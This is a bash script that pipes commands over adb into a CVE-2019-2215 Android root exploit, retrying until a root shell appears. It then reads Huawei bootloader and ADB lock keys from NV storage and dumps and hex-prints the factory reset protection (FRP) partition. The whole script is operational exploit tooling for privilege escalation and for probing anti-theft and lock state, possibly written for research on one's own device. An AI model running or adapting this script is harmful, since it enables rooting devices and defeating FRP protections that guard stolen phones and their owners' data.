#!/bin/bash
# Read the lock-related NV keys and the frp partition, retrying the race if needed.
#
# The exploit's race can lose (~4 in 5 runs when the system is busy), and a lost
# run means the payload never reaches its shell - so anything piped after it simply
# does not execute. Retry until we see the root prompt, then run the reads.
set -u
run_root() {
  # $1 = script to pipe into the exploit shell
  local script="$1" attempt out
  for attempt in 1 2 3 4 5; do
    out=$(printf '%s' "$script" | timeout 200 adb shell /data/local/tmp/cve-2019-2215 2>&1 | tr -d '\000')
    if echo "$out" | grep -aq "uid=0(root)"; then
      echo "$out"
      return 0
    fi
    echo "  [attempt $attempt lost the race]" >&2
    sleep 20
  done
  echo "$out"
  return 1
}

echo "############ lock-related NV keys and the frp partition"
run_root 'id
cat /proc/self/attr/current
echo "=== NV keys ==="
/data/local/tmp/hisi-nve r BOOTCTL
/data/local/tmp/hisi-nve r ADBLOCK
/data/local/tmp/hisi-nve r FBLOCK
echo "=== frp partition ==="
dd if=/dev/block/bootdevice/by-name/frp of=/data/local/tmp/frp.bin bs=4096
od -A x -t x1z -N 256 /data/local/tmp/frp.bin
echo "=== done ==="
exit' 2>&1 | grep -aE "=== |FBLOCK [0-9]|BOOTCTL|ADBLOCK|000000|000001|000010|000020|uid=0|context=" | head -40
